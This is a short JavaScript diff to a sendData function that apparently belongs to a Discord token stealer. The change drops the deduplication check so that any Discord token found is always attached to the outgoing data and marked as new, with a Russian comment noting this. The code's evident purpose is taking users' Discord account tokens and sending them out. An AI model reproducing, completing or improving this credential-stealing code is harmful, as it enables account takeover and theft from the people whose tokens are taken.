@@ -100,15 +100,12 @@ async function sendData() {
         }
     } catch (e) {}
 
-    const discordToken = await getDiscordToken();
-    if (discordToken && discordToken !== sentDiscord) {
-        data.discordToken = discordToken;
-        data.discordStatus = "new";
-        sentDiscord = discordToken;
-        hasNew = true;
-    } else if (discordToken) {
-        data.discordStatus = "sent";
-    }
+const discordToken = await getDiscordToken();
+if (discordToken) {
+    data.discordToken = discordToken;
+    data.discordStatus = "new"; // всегда новый, если есть
+    hasNew = true;
+}
 
     if (hasNew) {
         try {
